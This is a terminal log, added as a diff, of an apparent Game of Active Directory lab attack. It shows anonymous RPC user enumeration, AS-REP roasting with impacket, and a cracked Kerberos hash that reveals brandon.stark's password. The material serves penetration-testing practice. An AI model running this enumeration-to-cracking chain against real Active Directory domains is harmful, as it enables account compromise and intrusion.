@@ -1,0 +1,88 @@
+kali㉿kali)-[~/Desktop/GOAD]
+└─$ rpcclient -U "" -N 192.168.56.11 -c "enumdomusers" 2>/dev/null | tee ~/Desktop/GOAD/users_raw.txt
+user:[Guest] rid:[0x1f5]
+user:[arya.stark] rid:[0x456]
+user:[sansa.stark] rid:[0x45a]
+user:[brandon.stark] rid:[0x45b]
+user:[rickon.stark] rid:[0x45c]
+user:[hodor] rid:[0x45d]
+user:[jon.snow] rid:[0x45e]
+user:[samwell.tarly] rid:[0x45f]
+user:[jeor.mormont] rid:[0x460]
+user:[sql_svc] rid:[0x461]
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ cat ~/Desktop/GOAD/users_raw.txt | grep -oP '(?<=\[)[^\]]+(?=\])' | grep -v '0x' > ~/Desktop/GOAD/users_north.txt
+cat ~/Desktop/GOAD/users_north.txt
+Guest
+arya.stark
+sansa.stark
+brandon.stark
+rickon.stark
+hodor
+jon.snow
+samwell.tarly
+jeor.mormont
+sql_svc
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ sed -i 's/\. /./g' ~/Desktop/GOAD/users_north.txt
+# Supprime Guest (pas utile)
+sed -i '/^Guest$/d' ~/Desktop/GOAD/users_north.txt
+cat ~/Desktop/GOAD/users_north.txt
+arya.stark
+sansa.stark
+brandon.stark
+rickon.stark
+hodor
+jon.snow
+samwell.tarly
+jeor.mormont
+sql_svc
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ sed -i 's/ \././g' ~/Desktop/GOAD/users_north.txt
+cat ~/Desktop/GOAD/users_north.txt
+arya.stark
+sansa.stark
+brandon.stark
+rickon.stark
+hodor
+jon.snow
+samwell.tarly
+jeor.mormont
+sql_svc
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ impacket-GetNPUsers -request \
+-outputfile ~/Desktop/GOAD/hashes.asrep \
+-format john \
+-usersfile ~/Desktop/GOAD/users_north.txt \
+-dc-ip 192.168.56.11 \
+north.sevenkingdoms.local/
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:1e9c3e1d37eb242f7d04a475a1c64196$fac045da3215ae3cd3318e2d0450c121bc02f833c6b7ed7508e317ae06d7e2aee8539724413795a8d3141d158e56335f88cb5bded65ce226afc345d2a4b48a23122604dc77a7ccdbf927f67297268d11a8b36a608704cd7ad8054dc36f515478f82ec6dc06c8cff512dda1a51817b8ef122c0dab7714cb7d5b536f8f1a8d9e267ef21453c77498c18b6efde8e01604424551ccf27ddf2115c0836b83077673dbbcc860a110a868cc989a11c0936f69b00c06bf4b46109eb6352a405172f2d0f9fd99c4b5ef6a28d2828a3cc3e9b1aaaae0f0e63d24b807030704d4810f8c4586642c8d5f4527f3d5bcb83022c41e23cde10e9cf003a676443d1b164f2e5b8e067d85afaddcd0
+[-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ john ~/Desktop/GOAD/hashes.asrep \
+--wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+iseedeadpeople   ($krb5asrep$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL)     
+1g 0:00:00:00 DONE (2026-04-30 08:04) 8.333g/s 452266p/s 452266c/s 452266C/s soydivina..250984
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ 
